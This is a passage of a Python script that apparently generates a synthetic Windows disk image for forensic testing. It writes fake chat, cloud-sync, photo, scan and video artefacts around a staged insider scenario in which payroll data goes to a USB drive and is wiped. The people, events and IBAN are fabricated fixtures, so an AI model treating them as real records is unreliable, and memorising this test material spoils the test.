               (unix(utc(2025, 3, 12, 18, 9, 30)), unix(utc(2025, 3, 12, 18, 27, 34))))
    size = len(pdf())
    for n, (when, author, name, kind, body) in enumerate(SKYPE_MESSAGES, 1):
        db.execute("INSERT INTO Messages VALUES (?, 1, 1, '#alice.example/$dmitri.k.rival;5d1a0c9b2e3f4a67', ?, ?, 'dmitri.k.rival', ?, ?, ?, NULL, ?)",
                   (n, author, name, unix(when), kind, body.replace('{size}', str(size)), 3 if kind == 61 else 7))
    db.execute("INSERT INTO Calls VALUES (1, 1, ?, NULL, 'dmitri.k.rival', 754, 1, 0, '1-1741803300')", (unix(utc(2025, 3, 12, 18, 15)),))
    db.execute("INSERT INTO CallMembers VALUES (1, 1, 'dmitri.k.rival', 'Dmitri K', 754, '1-1741803300')")
    db.execute("INSERT INTO Transfers VALUES (1, 1, 1, 'dmitri.k.rival', 'Dmitri K', 8, 0, ?, ?, ?, 'offer-letter.pdf', ?, ?, 1, ?)",
               (unix(utc(2025, 3, 12, 18, 5, 2)), unix(utc(2025, 3, 12, 18, 5, 4)), r'C:\Users\alice\Documents\offer-letter.pdf',
                str(size), str(size), unix(utc(2025, 3, 12, 18, 5, 3))))
    db.commit()
    db.close()


ONEDRIVE = 'Users/alice/AppData/Local/Microsoft/OneDrive/settings/Personal/SyncEngineDatabase.db'
ONEDRIVE_SCOPE = 'A1B2C3D4E5F60718'
ONEDRIVE_FILES = [  # (folder, name, content, last change in the cloud)
    ('Backup', 'payroll-export.csv', None, utc(2026, 9, 1, 14, 26, 10)),
    ('Documents', 'q1-forecast.txt', 'Q1 2026 forecast draft. Figures to be confirmed.\n', utc(2026, 1, 15, 20, 31, 2)),
]


def onedrive_db():
    import hashlib
    path = OUT / ONEDRIVE
    path.parent.mkdir(parents=True, exist_ok=True)
    db = sqlite3.connect(path)
    db.executescript("""
        CREATE TABLE od_ScopeInfo_Records (scopeID TEXT PRIMARY KEY, siteID TEXT, webID TEXT, listID TEXT, tenantID TEXT, webURL TEXT,
                                           remotePath TEXT, spoPermissions INTEGER, shortcutVolumeID INTEGER, shortcutItemIndex INTEGER);
        CREATE TABLE od_ClientFolder_Records (parentScopeID TEXT, parentResourceID TEXT, resourceID TEXT PRIMARY KEY, eTag TEXT,
                                              folderName TEXT, folderStatus INTEGER, spoPermissions INTEGER, volumeID INTEGER, itemIndex INTEGER);
        CREATE TABLE od_ClientFile_Records (parentResourceID TEXT, resourceID TEXT PRIMARY KEY, eTag TEXT, fileName TEXT, fileStatus INTEGER,
                                            spoPermissions INTEGER, volumeID INTEGER, itemIndex INTEGER, lastChange INTEGER, size INTEGER,
                                            localHashDigest TEXT, sharedItem INTEGER, mediaDateTaken INTEGER, mediaWidth INTEGER,
                                            mediaHeight INTEGER, mediaDuration INTEGER, diskLastAccessTime INTEGER, diskCreationTime INTEGER);
    """)
    root = f'{ONEDRIVE_SCOPE}!101'
    db.execute('INSERT INTO od_ScopeInfo_Records VALUES (?, NULL, NULL, NULL, NULL, ?, ?, 0, NULL, NULL)',
               (ONEDRIVE_SCOPE, f'https://onedrive.live.com/?cid={ONEDRIVE_SCOPE.lower()}', '/'))
    folders = {}
    for n, name in enumerate(sorted({f for f, _, _, _ in ONEDRIVE_FILES}), 1):
        rid = f'{ONEDRIVE_SCOPE}!{200 + n}'
        folders[name] = rid
        db.execute('INSERT INTO od_ClientFolder_Records VALUES (?,?,?,?,?,?,?,?,?)',
                   (ONEDRIVE_SCOPE, root, rid, f'aRm9sZGVy{n}', name, 2, 0, 0x5E1F22C4, 9000 + n))
    for n, (folder, name, content, changed) in enumerate(ONEDRIVE_FILES, 1):
        data = (PAYROLL if content is None else content).encode()
        db.execute('INSERT INTO od_ClientFile_Records VALUES (?,?,?,?,?,?,?,?,?,?,?,?,NULL,NULL,NULL,NULL,?,?)',
                   (folders[folder], f'{ONEDRIVE_SCOPE}!{300 + n}', f'aRmlsZQ{n}', name, 2, 0, 0x5E1F22C4, 9100 + n, unix(changed),
                    len(data), hashlib.sha1(data).hexdigest().upper(), 0, unix(changed), unix(changed)))
    db.commit()
    db.close()


def chat_cloud_files():
    skype_db()
    onedrive_db()
    write('Users/alice/AppData/Local/Dropbox/info.json', json.dumps(
        {'personal': {'path': r'C:\Users\alice\Dropbox', 'host': 4029384756, 'is_team': False, 'subscription_type': 'Basic'}}))
    rnd = random.Random(11)
    blob = lambda n: bytes(rnd.getrandbits(8) for _ in range(n))
    for rel, size in [
            ('Users/alice/AppData/Local/Packages/5319275A.WhatsAppDesktop_cv1g1gvanyjgm/LocalState/sessions/0F1E2D3C4B5A6978/nondb_settings18.dat', 2048),
            ('Users/alice/AppData/Local/Packages/5319275A.WhatsAppDesktop_cv1g1gvanyjgm/LocalState/sessions/0F1E2D3C4B5A6978/session.db', 8192),
            ('Users/alice/AppData/Roaming/Telegram Desktop/tdata/key_datas', 1024),
            ('Users/alice/AppData/Roaming/Telegram Desktop/tdata/D877F783D5D3EF8C/maps', 4096)]:
        write(rel, blob(size))


def comms_files():
    chrome_profile_files()
    firefox_profile_files()
    thunderbird()
    chat_cloud_files()


# ---------------------------------------------------------------------------------------------------- Phase 10
# Pictures and videos. The phone photo of the SanDisk drive on alice's desk (EXIF: Pixel 8, taken 10:10:32 local with its
# offset -04:00, GPS at the office), an earlier photo without an offset (its time is local, read with the computer's zone),
# the whiteboard with the plan written on it (for OCR), a scanned payment instruction (an image-only PDF, for OCR and found
# data), and a 3-second video in three scenes with a creation time and a location.
PHOTO_GPS = {'path': 'Users/alice/Pictures/IMG_20260901_101032.jpg', 'make': 'Google', 'model': 'Pixel 8',
             'local': '2026:09:01 10:10:32', 'offset': '-04:00', 'taken': utc(2026, 9, 1, 14, 10, 32),
             'lat': 42.3601, 'lon': -71.0589, 'alt': 12.5, 'size': (1024, 768)}
PHOTO_LOCAL = {'path': 'Users/alice/Pictures/IMG_20260830_181500.jpg', 'make': 'Google', 'model': 'Pixel 8',
               'local': '2026:08:30 18:15:00', 'taken': utc(2026, 8, 30, 22, 15), 'size': (800, 600)}
WHITEBOARD_TEXT = ['PAYROLL EXPORT -> USB', 'WIPE AFTER UPLOAD']
SCAN_LINES = ['PAYMENT INSTRUCTION', 'Beneficiary: A. Example', 'IBAN: GB33 BUKB 2020 1555 5555 55', 'Reference: September payroll']
SCAN_IBAN = 'GB33BUKB20201555555555'
VIDEO = {'path': 'Users/alice/Videos/VID_20260901_101800.mp4', 'recorded': utc(2026, 9, 1, 14, 18), 'duration': 3,
         'size': (320, 240), 'location': '+42.3601-071.0589+012.500/', 'scenes': ('testsrc', 'smptebars', 'red')}
FONT = '/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf'


def _font(size):
    from PIL import ImageFont
    return ImageFont.truetype(FONT, size)


def _rational(value):
    deg = int(value)
    minutes = int((value - deg) * 60)
    seconds = round(((value - deg) * 60 - minutes) * 60 * 100)
    return ((deg, 1), (minutes, 1), (seconds, 100))


def photo(spec, gps=True) -> bytes:
    import piexif
    from PIL import Image, ImageDraw
    w, h = spec['size']
    img = Image.new('RGB', (w, h), (139, 108, 66))  # a wooden desk
    d = ImageDraw.Draw(img)
    d.rectangle((w * 0.35, h * 0.42, w * 0.62, h * 0.55), fill=(196, 22, 28))   # the drive
    d.rectangle((w * 0.62, h * 0.45, w * 0.70, h * 0.52), fill=(190, 190, 190))  # its connector
    d.text((w * 0.37, h * 0.45), 'SanDisk', fill=(255, 255, 255), font=_font(int(h * 0.04)))
    zeroth = {piexif.ImageIFD.Make: spec['make'], piexif.ImageIFD.Model: spec['model'], piexif.ImageIFD.Software: 'HDR+ 1.0',
              piexif.ImageIFD.Orientation: 1}
    exif = {piexif.ExifIFD.DateTimeOriginal: spec['local'], piexif.ExifIFD.PixelXDimension: w, piexif.ExifIFD.PixelYDimension: h}
    if spec.get('offset'):
        exif[piexif.ExifIFD.OffsetTimeOriginal] = spec['offset']
    gps_ifd = {}
    if gps and 'lat' in spec:
        t = spec['taken']
        gps_ifd = {piexif.GPSIFD.GPSLatitudeRef: 'N' if spec['lat'] >= 0 else 'S', piexif.GPSIFD.GPSLatitude: _rational(abs(spec['lat'])),
                   piexif.GPSIFD.GPSLongitudeRef: 'E' if spec['lon'] >= 0 else 'W', piexif.GPSIFD.GPSLongitude: _rational(abs(spec['lon'])),
                   piexif.GPSIFD.GPSAltitudeRef: 0, piexif.GPSIFD.GPSAltitude: (int(spec['alt'] * 10), 10),
                   piexif.GPSIFD.GPSDateStamp: t.strftime('%Y:%m:%d'), piexif.GPSIFD.GPSTimeStamp: ((t.hour, 1), (t.minute, 1), (t.second, 1))}
    buf = io.BytesIO()
    img.save(buf, 'JPEG', quality=85, exif=piexif.dump({'0th': zeroth, 'Exif': exif, 'GPS': gps_ifd}))
    return buf.getvalue()


def whiteboard_png() -> bytes:
    from PIL import Image, ImageDraw
    img = Image.new('RGB', (1280, 440), (246, 246, 242))
    d = ImageDraw.Draw(img)
    for y in (310, 340, 370):
        d.line((60, y, 1200, y + 10), fill=(60, 110, 200), width=4)
    d.text((60, 70), WHITEBOARD_TEXT[0], fill=(20, 20, 20), font=_font(64))
    d.text((60, 170), WHITEBOARD_TEXT[1], fill=(170, 20, 20), font=_font(48))
    buf = io.BytesIO()
    img.save(buf, 'PNG')
    return buf.getvalue()


def scan_pdf() -> bytes:
    from PIL import Image, ImageDraw
    page = Image.new('L', (1240, 1754), 250)  # A4 at 150 dpi, greyscale, like a scanner's output
    d = ImageDraw.Draw(page)
    y = 160
    for i, line in enumerate(SCAN_LINES):
        d.text((120, y), line, fill=15, font=_font(56 if i == 0 else 40))
        y += 130 if i == 0 else 90
    buf = io.BytesIO()
    page.save(buf, 'PDF', resolution=150)
    return buf.getvalue()


def video(dest: Path):
    import subprocess
    w, h = VIDEO['size']
    srcs = {'testsrc': f'testsrc=size={w}x{h}:rate=25:duration=1', 'smptebars': f'smptebars=size={w}x{h}:rate=25:duration=1',
            'red': f'color=c=red:size={w}x{h}:rate=25:duration=1'}
    args = ['ffmpeg', '-v', 'error', '-y']
    for s in VIDEO['scenes']:
        args += ['-f', 'lavfi', '-i', srcs[s]]
    n = len(VIDEO['scenes'])
    args += ['-filter_complex', ''.join(f'[{i}:v]' for i in range(n)) + f'concat=n={n}:v=1:a=0[v]', '-map', '[v]',
             '-c:v', 'libx264', '-pix_fmt', 'yuv420p', '-g', '25', '-bf', '0',
             '-metadata', 'creation_time=' + VIDEO['recorded'].strftime('%Y-%m-%dT%H:%M:%S.000000Z'),
             '-metadata', 'location=' + VIDEO['location'], '-movflags', '+faststart', str(dest)]
    dest.parent.mkdir(parents=True, exist_ok=True)
    subprocess.run(args, check=True)


def media_files():
    write(PHOTO_GPS['path'], photo(PHOTO_GPS))
    write(PHOTO_LOCAL['path'], photo(PHOTO_LOCAL, gps=False))
    write('Users/alice/Documents/scan-payment-instruction.pdf', scan_pdf())
    video(OUT / VIDEO['path'])


def main():
    OUT.mkdir(parents=True, exist_ok=True)
    write('Windows/INF/setupapi.dev.log', SETUPAPI.replace('\n', '\r\n'))
    chrome_history(OUT / 'Users/alice/AppData/Local/Google/Chrome/User Data/Default/History')
    firefox_places(OUT / 'Users/alice/AppData/Roaming/Mozilla/Firefox/Profiles/k2x8.default-release/places.sqlite')
    write('Users/alice/Documents/project-notes.txt', PROJECT_NOTES)
    # Stamped in standard time (EST) by make-test-image.sh, to prove daylight saving is handled per date.
    write('Users/alice/Documents/q1-forecast.txt', 'Q1 2026 forecast draft. Figures to be confirmed.\n')
    write('Users/alice/Documents/year-end-checklist.txt', 'Year-end checklist: archive mail, renew licences.\n')
    # Deleted by make-test-image.sh after being copied into the image.
    write('Users/alice/Documents/payroll-export.csv', PAYROLL)
    write('Users/alice/Downloads/cleanup.ps1', CLEANUP_PS1)
    windows_activity()
    write('Users/alice/Pictures/whiteboard.png', whiteboard_png())
    write('Users/alice/Documents/offer-letter.pdf', pdf())
    hidden_files()
    content_files()
    container_files()
    event_logs()
    user_activity_files()
    comms_files()
    media_files()
    print(PREFETCH_NAME)


if __name__ == '__main__':
    main()
